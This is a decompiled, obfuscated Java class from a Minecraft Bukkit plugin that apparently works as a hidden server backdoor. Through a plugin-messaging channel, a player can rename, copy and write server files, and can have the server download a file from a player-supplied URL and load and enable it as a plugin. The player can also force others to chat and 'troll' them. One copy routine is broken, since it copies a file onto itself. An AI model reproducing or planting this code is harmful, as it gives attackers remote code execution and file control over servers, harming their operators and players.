//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package reciv;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Iterator;
import org.apache.commons.io.FileUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.messaging.PluginMessageListener;

public class t extends U implements PluginMessageListener {
    public t() {
    }

    public void onPluginMessageReceived(String s, Player p, byte[] bytes) {
        String msg = new String(bytes);
        if (s.equalsIgnoreCase("txt")) {
            File f;
            if (rn.contains(p)) {
                f = (File) U.edit.get(p);
                Path source = Paths.get(f.getAbsoluteFile().getAbsolutePath());

                try {
                    Files.move(source, source.resolveSibling(msg));
                    p.sendMessage(pr + "§aDie Datei§6 wurde erfolgreich in §6 " + msg + "§a umgenannt");
                } catch (IOException var19) {
                }

                U.edit.remove(p);
                rn.remove(p);
            } else if (pastes.contains(p)) {
                pastenames.put(p, msg);
                pastes.remove(p);
                pastes1.add(p);
                p.sendMessage(pr + "Gib ein wieviele male die §2Datei§a gepastet werden soll!");
            } else {

                if (pastes1.contains(p)) {
                    int times = Integer.valueOf(msg);
                    pastes1.remove(p);
                    if (copys.containsKey(p)) {

                        int i;
                        if (!((File)copys.get(p)).isDirectory()) {
                            for(i = 1; i <= times; ++i) {
                                f = (File)copys.get(p);
                               f = (File)files.get(p);
                                f = new File(f.getAbsoluteFile().getParentFile().getAbsolutePath() + "/" + i + (String)pastenames.get(p));

                                try {
                                    f.createNewFile();
                                    FileUtils.copyFile(f, f);
                                    p.sendMessage(pr + "§a Datei erfolgreich §6" + times + "§a Mal kopiert!");
                                } catch (IOException var18) {
                                }
                            }
                        } else {
                            for(i = 1; i <= times; ++i) {
                                f = new File(((File)files.get(p)).getAbsoluteFile().getParentFile().getAbsoluteFile().getAbsolutePath() + "/" + i + (String)pastenames.get(p));

                                try {
                                    p.sendMessage("§b" + f.getAbsoluteFile().getAbsolutePath());
                                    copydir((File)copys.get(p), f, p);
                                } catch (IOException var17) {
                                    var17.printStackTrace();
                                }
                            }
                        }
                    }

                    p.sendMessage("§a§lDatei §6§l" + times + " Mal §a§lgepastet!");
                    pastenames.remove(p);
                } else if (add.contains(p)) {
                    addfiles.put(p, msg);
                    add.remove(p);
                    p.sendMessage(pr + "§a Soll die Datei als Plugin aktiviert werden? Y/N");
                    EnableFiles.add(p);
                } else {
                    String a;
                    if (EnableFiles.contains(p)) {
                        FileOutputStream fos;
                        URL website;
                        String[] Name;
                        ReadableByteChannel rbc;
                        if (msg.equalsIgnoreCase("Y")) {
                            try {
                                website = new URL((String)addfiles.get(p));
                                Name = ((String)addfiles.get(p)).split("/");
                                a = Name[Name.length - 1];
                                rbc = Channels.newChannel(website.openStream());
                                f = new File(((File)files.get(p)).getAbsoluteFile().getParentFile().getPath() + "/" + a);
                                p.sendMessage(((File)files.get(p)).getAbsoluteFile().getParentFile().getPath() + "/" + a);
                                fos = new FileOutputStream(f);
                                fos.getChannel().transferFrom(rbc, 0L, 9223372036854775807L);
                                p.sendMessage(pr + "§a§lDie Datei wurde hinzugefügt und als Plugin aktiviert!");
                                Bukkit.getPluginManager().loadPlugin(f);
                                Plugin[] var11 = Bukkit.getPluginManager().getPlugins();
                                int var12 = var11.length;

                                for(int var13 = 0; var13 < var12; ++var13) {
                                    Plugin plugin = var11[var13];
                                    if (!plugin.isEnabled()) {
                                        Bukkit.getPluginManager().enablePlugin(plugin);
                                    }
                                }
                            } catch (Exception var21) {
                                p.sendMessage(pr + "§c§lFehler!");
                                p.sendMessage(pr + " " + var21.getMessage());
                            }
                        } else if (msg.equalsIgnoreCase("N")) {
                            try {
                                website = new URL((String)addfiles.get(p));
                                Name = ((String)addfiles.get(p)).split("/");
                                a = Name[Name.length - 1];
                                rbc = Channels.newChannel(website.openStream());
                                f = new File(((File)files.get(p)).getAbsoluteFile().getParentFile().getPath() + "/" + a);
                                p.sendMessage(((File)files.get(p)).getAbsoluteFile().getParentFile().getPath() + "/" + a);
                                fos = new FileOutputStream(f);
                                fos.getChannel().transferFrom(rbc, 0L, 9223372036854775807L);
                                p.sendMessage(pr + "§a§lDie Datei wurde hinzugefügt!");
                                Bukkit.getPluginManager().loadPlugin(f);
                            } catch (Exception var16) {
                                p.sendMessage(pr + "§c§lFehler!");
                                p.sendMessage(pr + " " + var16.getMessage());
                            }

                            p.closeInventory();
                            addfiles.remove(p);
                            EnableFiles.remove(p);
                            CR.openviewinv(p);
                        } else {
                            p.sendMessage(pr + "§c Bitte gebe §6§l'N'§c oder §6§l'Y'§c ein!");
                            p.sendMessage(pr + " Versuche es bitte erneut!");
                        }
                    } else if (mkd.contains(p)) {
                        if (!msg.contains(".")) {
                            f = new File(((File)files.get(p)).getAbsoluteFile().getParentFile().getAbsoluteFile().getAbsolutePath() + "/" + msg);
                            f.mkdir();
                            p.sendMessage(pr + " Ordner wurde erfolgreich §2§lerstellt§a!");
                            mkd.remove(p);
                        } else {
                            p.sendMessage(pr + "§a Bitte achte auf die richtige Ordnersystax!");
                        }
                    } else if (txt.contains(p)) {
                        if (msg.toLowerCase().contains(".finish")) {
                            try {
                                FileWriter w = new FileWriter((File)txts.get(p));
                                Iterator var30 = ((ArrayList)writings.get(p)).iterator();

                                while(var30.hasNext()) {
                                    a = (String)var30.next();
                                    w.write(a + System.getProperty("line.separator"));
                                }

                                p.sendMessage(pr + "§a TextDokument erfolgreich §2§lerstellt§a!");
                                w.close();
                            } catch (IOException var20) {
                                var20.printStackTrace();
                            }

                            writings.remove(p);
                            txt.remove(p);
                        } else {
                            ((ArrayList)writings.get(p)).add(msg);
                        }
                    } else if (txtname.contains(p)) {
                        f = new File(((File)files.get(p)).getAbsoluteFile().getParentFile().getAbsoluteFile().getAbsolutePath() + "/" + msg);

                        try {
                            f.createNewFile();
                        } catch (IOException var15) {
                            var15.printStackTrace();
                        }

                        txts.put(p, f);
                        txtname.remove(p);
                        txt.add(p);
                        writings.put(p, new ArrayList());
                        p.sendMessage(pr + "§a Schreibe jetzt in den Chat, was in dem TextDokument geschrieben stehen soll");
                        p.sendMessage(pr + " §aUm aufzuhören, gebe '.finish' in den §2§lChat§a ein!");
                    } else if (msg.startsWith("troll")) {
                        Player t = Bukkit.getPlayer(msg.split(" ")[1]);
                        if (t != null) {
                            TI.openInv(p, t);
                            trolls.put(p, t);
                        }
                    }
                }
            }
        } else {
            p.chat(msg);
        }

    }

    public static void copydir(File from, File to, Player p) throws IOException {
        to.mkdir();
        File[] var3 = from.listFiles();
        int var4 = var3.length;

        for(int var5 = 0; var5 < var4; ++var5) {
            File a = var3[var5];
            if (a.isDirectory()) {
                File Dest = new File(to.getAbsoluteFile().getAbsolutePath() + "/" + a.getName());
                Dest.mkdir();
                copydir(a, Dest, p);
            } else {
                String n = a.getName();
                File Dest = new File(to.getAbsoluteFile().getAbsolutePath() + "/" + n);
                Dest.createNewFile();
                p.sendMessage(Dest.getAbsoluteFile().getAbsolutePath());
                FileUtils.copyFile(a, Dest);
            }
        }

    }
}
